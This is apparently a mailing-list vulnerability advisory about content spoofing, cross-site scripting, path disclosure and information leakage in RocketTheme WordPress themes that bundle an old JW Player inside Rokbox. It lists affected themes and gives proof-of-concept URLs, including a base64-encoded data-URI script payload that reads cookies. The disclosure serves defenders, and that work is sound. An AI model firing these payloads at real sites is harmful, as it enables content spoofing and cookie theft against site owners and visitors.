Subject: Multiple vulnerabilities in multiple themes for
	WordPress

Hello list!

Some time ago, when I've found vulnerabilities in plugin BuddyPress for 
WordPress (particularly in Affinity BuddyPress theme for it) with Rokbox, 
which I disclosed earlier, I also found multiple vulnerable themes for WP 
with Rokbox.

So I want to warn you about multiple vulnerabilities in multiple themes for 
WordPress. These are themes developed by Rokbox's developers. And they put 
Rokbox (with JW Player, but without TimThumb) into their themes.

These are Content Spoofing, Cross-Site Scripting, Full path disclosure and 
Information Leakage vulnerabilities. I've disclosed vulnerabilities in JW 
Player in June and August (including in commercial version JW Player Pro) 
and disclosed vulnerabilities in Rokbox in December. These vulnerabilities 
are similar to vulnerabilities in Affinity BuddyPress theme. Also I've found 
many WP themes by other developers with Rokbox, but I'd write about them 
separately, because they have much more holes.

-------------------------
Affected products:
-------------------------

Vulnerable are all WordPress themes by RocketTheme (during quick research I 
found 16 themes for WP, in addition to above-mentioned theme for BP, but I 
supposed all their themes contain Rokbox with JW Player 4.4.198). They 
haven't removed this vulnerable version of JW Player from Rokbox and so from 
any of their themes (for WP and BP), when I've informed them in August.

Here are these 16 vulnerable themes, which I found:

rt_afterburner_wp
rt_refraction_wp
rt_solarsentinel_wp
rt_mixxmag_wp (Mixxmag)
rt_iridium_wp
rt_infuse_wp (infuse)
rt_perihelion_wp
rt_replicant2_wp
rt_affinity_wp
rt_nexus_wp
rt_sentinel
rt_mynxx_wp_vestnikp
rt_mynxx_wp (rt.mynxx.wp)
rt_moxy_wp
rt_terrantribune_wp
rt_meridian_wp

They will be added to those 94 vulnerable themes for WordPress, in which 
I've found vulnerabilities (http://websecurity.com.ua/4915/).

In Google's index there are now up to 634000 pages with Rokbox at WP sites. 
So there are a lot of vulnerable themes and web sites with these themes.

Content Spoofing (WASC-12):

In parameter file there can be set as video, as audio files.

Swf-file of JW Player accepts arbitrary addresses in parameters file and 
image, which allows to spoof content of flash - i.e. by setting addresses of 
video (audio) and/or image files from other site.

http://site/wordpress/wp-content/themes/rt_afterburner_wp/js/rokbox/jwplayer/jwplayer.swf?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
http://site/wordpress/wp-content/themes/rt_afterburner_wp/js/rokbox/jwplayer/jwplayer.swf?file=1.flv&image=1.jpg

Content Spoofing (WASC-12):

Swf-file of JW Player accepts arbitrary addresses in parameter config, which 
allows to spoof content of flash - i.e. by setting address of config file 
from other site (parameters file and image in xml-file accept arbitrary 
addresses). For loading of config file from other site it needs to have 
crossdomain.xml.

http://site/wordpress/wp-content/themes/rt_afterburner_wp/js/rokbox/jwplayer/jwplayer.swf?config=1.xml

1.xml

<config>
  <file>1.flv</file>
  <image>1.jpg</image>
</config>

Content Spoofing (WASC-12):

http://site/wordpress/wp-content/themes/rt_afterburner_wp/js/rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=http://site

XSS (WASC-08):

http://site/wordpress/wp-content/themes/rt_afterburner_wp/js/rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B

Full path disclosure (WASC-13):

In all these themes there is FPD in index.php 
(http://site/wordpress/wp-content/themes/rt_afterburner_wp/ and the same for 
other themes), which works at default PHP settings. Also potentially there 
are FPD in other php-files of these themes.

Information Leakage (WASC-13):

There are sites with rt_mixxmag_wp theme, which have error log with full 
paths.
